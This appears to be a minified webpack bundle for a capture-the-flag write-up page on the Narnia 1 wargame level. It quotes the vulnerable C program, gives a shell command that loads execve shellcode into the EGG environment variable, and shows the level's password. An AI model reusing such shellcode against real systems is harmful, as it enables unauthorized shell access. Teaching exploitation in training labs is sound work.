(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[755],{48021:function(e,n,i){(window.__NEXT_P=window.__NEXT_P||[]).push(["/narnia/narnia1",function(){return i(37103)}])},90654:function(e,n,i){"use strict";var t=i(85893),r=i(23457),a=i.n(r),s=i(5227),o=i(84283);n.Z=function(e){var n=e.children,i=e.language;return(0,t.jsx)("div",{className:a().CodeBlock,children:(0,t.jsx)(s.Z,{language:i,style:o.cL,children:n})})}},69242:function(e,n,i){"use strict";var t=i(85893),r=i(41664),a=i(98574),s=i.n(a);n.Z=function(e){var n=e.link1,i=e.link2;return(0,t.jsxs)("div",{className:s().pageNav,children:[(0,t.jsx)("div",{children:n?(0,t.jsx)(r.default,{href:n,children:(0,t.jsx)("a",{title:"Previous page",className:s().navButton,children:"\u25c0"})}):""}),(0,t.jsx)("div",{children:i?(0,t.jsx)(r.default,{href:i,children:(0,t.jsx)("a",{title:"Next page",className:s().navButton,children:"\u25b6"})}):""})]})}},20586:function(e,n,i){"use strict";var t=i(85893),r=i(86655),a=i.n(r),s=i(5227),o=i(84283),l=i(67294);n.Z=function(e){var n=e.children,i=(0,l.useState)(!1),r=i[0],c=i[1];return(0,t.jsxs)("section",{children:[(0,t.jsx)("h2",{children:"Key"}),(0,t.jsxs)("div",{className:a().codeBlock,children:[(0,t.jsx)("div",{className:a().spoilerToggler,children:(0,t.jsx)("button",{onClick:function(){return c(!r)},children:"Click to Reveal"})}),(0,t.jsx)("div",{className:a().spoilerContainer,children:(0,t.jsx)("div",{className:"".concat(a().spoiler," ").concat(r?a().show:""),children:(0,t.jsx)(s.Z,{language:"",style:o.cL,customStyle:{margin:0},children:n})})})]})]})}},37103:function(e,n,i){"use strict";i.r(n);var t=i(85893),r=i(90654),a=i(69242),s=i(20586);n.default=function(){return(0,t.jsxs)("div",{children:[(0,t.jsx)("h1",{children:"Narnia 1"}),(0,t.jsxs)("section",{children:[(0,t.jsx)("h2",{children:"Experience"}),(0,t.jsx)("p",{children:"Starting this level, we again start by looking at the source code."}),(0,t.jsx)(r.Z,{language:"c",children:'int main(){\nint (*ret)();\n\nif(getenv("EGG")==NULL){\n  printf("Give me something to execute at the env-variable EGG\n");\n  exit(1);\n}\n\nprintf("Trying to execute EGG!\n");\nret = getenv("EGG");\nret();\n\nreturn 0;\n}'}),(0,t.jsxs)("p",{children:["We may observe several interesting thing, first a declaration of a pointer called ",(0,t.jsx)("code",{children:"ret"})," which points to a function. There is also a usage of ",(0,t.jsx)("code",{children:"getenv"})," which gets an environment variable, which here seems to be called ",(0,t.jsx)("em",{children:"EGG"}),". It then sets the function pointer to whatever is inside the EGG environment varialbe and then executes it. So, clearly, we must insert some type of program into the EGG environment variable to obtain the password for Narnia 2."]}),(0,t.jsxs)("p",{children:["I could understand so far that we must set the environment variable to something executable, however, I did not know how to proceed. Searching setting environment variable vulnerabilities led to a ",(0,t.jsx)("a",{href:"https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables",children:"page in owasp.org"}),"."]})]}),(0,t.jsx)(r.Z,{language:"shell",children:"export EGG=$(python -c 'print(\"\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80\")')"}),(0,t.jsx)(s.Z,{children:"nairiepecu"}),(0,t.jsx)(a.Z,{link1:"/narnia/narnia0",link2:"/narnia/narnia2"})]})}},23457:function(e){e.exports={CodeBlock:"CodeBlock_CodeBlock___IBBd"}},98574:function(e){e.exports={pageNav:"PageNav_pageNav__NXqbT",navButton:"PageNav_navButton__yHhmO"}},86655:function(e){e.exports={codeBlock:"SpoilerKey_codeBlock__KWl0d",spoilerToggler:"SpoilerKey_spoilerToggler__HCeWZ",spoiler:"SpoilerKey_spoiler__YWx_s",show:"SpoilerKey_show__VIJ75",spoilerContainer:"SpoilerKey_spoilerContainer__O76It"}}},function(e){e.O(0,[369,774,888,179],(function(){return n=48021,e(e.s=n);var n}));var n=e.O();_N_E=n}]);